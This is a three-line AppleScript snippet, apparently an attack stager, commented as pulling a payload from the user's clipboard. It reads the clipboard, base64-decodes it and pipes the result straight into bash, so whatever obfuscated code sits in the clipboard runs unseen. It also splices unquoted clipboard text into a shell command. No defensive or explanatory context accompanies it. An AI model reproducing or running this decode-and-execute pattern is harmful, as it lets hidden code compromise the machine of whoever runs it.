-- Pulls payload from user clipboard
set b64 to the clipboard
do shell script "echo " & b64 & " | base64 -D | bash"
